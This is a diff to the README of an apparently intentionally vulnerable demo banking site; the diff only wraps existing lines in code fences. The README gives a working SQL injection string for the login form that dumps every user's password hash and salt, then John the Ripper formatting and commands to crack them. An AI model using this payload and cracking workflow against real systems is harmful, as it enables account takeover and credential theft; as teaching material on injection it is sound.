@@ -13,22 +13,22 @@ Get Started
 
 As a prerequisite, make sure you have web.py (version 0.3) and SQLite 
 capabilities. Begin by creating the database of user accounts:
-
+```
 sqlite3 BankAccount.db < create_accounts.sql
-
+```
 Then, to run the website, execute:
-
+```
 python anaflow_bank.py [optional port number, default is 8080]
-
+```
 
 Demonstration Overview
 ----------------------
 
 In the demonstration, we perform an SQL injection via the login form. We set
 the username to be:
-
+```
 ' OR 1=1 UNION SELECT GROUP_CONCAT(Username || ' : ' || PasswordHash || ' : ' || Salt, '  ||  ') AS Amount FROM BankAccount WHERE '1' = '1
-
+```
 (The password can be any string.) This allows us to see all of the users' 
 salts and password hashes, which are SHA-1 for this purpose. We then use 
 John the Ripper (JTR) to expose any weak passwords. Despite each account 
@@ -39,36 +39,34 @@ combination on each line (without the brackets).
 In the MacOS version of John 1.7.9-jumbo-7 (see 
 http://openwall.info/wiki/john/custom-builds#Compiled-for-Mac-OS-X), 
 format each line of the password file as:
-
+```
 [username]:$SHA1p$[salt]$[hash]
-
+```
 For example:
-
+```
 admin:$SHA1p$*Utf&+s5$317fe16a5f409e871b21c3460a75dab8dc906767
-
+```
 Then, run JTR to recover some of the passwords. 
-
+```
 ./john --format=sha1-gen [password file]
-
 ./john --show [password file] 
-
+```
 
 For the Windows version of John 1.7.9-jumbo-7-Win-32 (see 
 http://openwall.info/wiki/john/custom-builds#Compiled-for-Windows).
 format each line of the password file as:
-
+```
 [username]:$dynamic_25$[hash]$[salt]
-
+```
 For example:
-
+```
 admin:$dynamic_25$317fe16a5f409e871b21c3460a75dab8dc906767$*Utf&+s5
-
+```
 Then, run JTR to recover some of the passwords. 
-
+```
 john [password file]
-
 john --show [password file] 
-
+```
 
 Disclaimer
 ----------
